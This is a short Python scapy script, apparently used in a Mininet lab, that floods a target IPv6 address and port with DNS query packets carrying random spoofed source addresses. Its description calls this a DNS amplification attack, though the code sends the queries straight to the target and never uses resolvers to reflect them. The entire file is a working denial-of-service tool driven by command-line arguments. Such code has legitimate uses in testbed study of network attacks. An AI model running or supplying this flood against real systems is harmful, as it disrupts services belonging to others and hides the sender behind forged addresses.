from scapy.all import *
import random
import argparse

def generate_fake_ipv6():
    return "2001:db8:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}".format(
        random.randint(0, 0xffff), random.randint(0, 0xffff),
        random.randint(0, 0xffff), random.randint(0, 0xffff),
        random.randint(0, 0xffff), random.randint(0, 0xffff)
    )

def create_dns_query_packet(src_ip, dst_ip, dst_port):
    ip = IPv6(src=src_ip, dst=dst_ip)
    udp = UDP(sport=53, dport=dst_port)
    dns = DNS(rd=1, qd=DNSQR(qname="example.com"))
    return ip/udp/dns

def simulate_attack(target_ip, target_port, num_fake_ips, packets_per_ip):
    for _ in range(num_fake_ips):
        fake_ip = generate_fake_ipv6()
        for _ in range(packets_per_ip):
            packet = create_dns_query_packet(fake_ip, target_ip, target_port)
            send(packet, verbose=False)
# h1 python /mininet/host-service/dns-reflect.py 2001:1:2::1 5001 100 10
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate a DNS Amplification Attack using IPv6.")
    parser.add_argument("target_ip", help="Target IPv6 address")
    parser.add_argument("target_port", type=int, help="Target port number")
    parser.add_argument("num_fake_ips", type=int, help="Number of fake IPv6 addresses to use")
    parser.add_argument("packets_per_ip", type=int, help="Number of packets to send per fake IP")

    args = parser.parse_args()

    simulate_attack(args.target_ip, args.target_port, args.num_fake_ips, args.packets_per_ip)
